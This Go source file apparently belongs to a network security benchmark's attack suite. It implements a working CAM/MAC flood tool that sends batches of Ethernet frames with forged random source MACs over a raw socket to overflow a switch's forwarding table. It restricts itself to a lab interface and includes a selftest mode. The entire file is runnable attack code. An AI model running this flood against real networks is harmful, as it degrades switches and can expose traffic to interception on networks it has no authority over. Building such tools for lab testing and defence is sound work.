package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const macFloodPayload = "pnet-secbench-mac-flood"

func buildFrame(srcMAC net.HardwareAddr) []byte {
	dstMAC := attackcommon.ForgedMAC()
	randomIP := attackcommon.ForgedMAC()
	srcIP := net.IPv4(10, randomIP[1]%255, randomIP[2]%255, randomIP[3]%255)

	frame := make([]byte, 14)
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	return append(frame, attackcommon.BuildIPv4(srcIP, net.IPv4bcast, 0, []byte(macFloodPayload))...)
}

func run() int {
	fs, common := attackcommon.BaseParser("CAM/MAC flood: random source MACs to overflow the switch forwarding table")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	frame := buildFrame(attackcommon.ForgedMAC())
	if common.Selftest {
		attackcommon.SelftestOK("mac_flood", fmt.Sprintf("flood frame len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		// Batches of 50 per iteration keep the loop's --interval meaningful
		// while still generating real flood volume.
		for i := 0; i < 50; i++ {
			if err := sender.Send(buildFrame(attackcommon.ForgedMAC())); err != nil {
				return fmt.Errorf("send MAC flood frame: %w", err)
			}
		}
		if n%10 == 0 {
			attackcommon.Status("SENT", fmt.Sprintf("batch #%d: 50 random-src frames", n+1))
		}
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
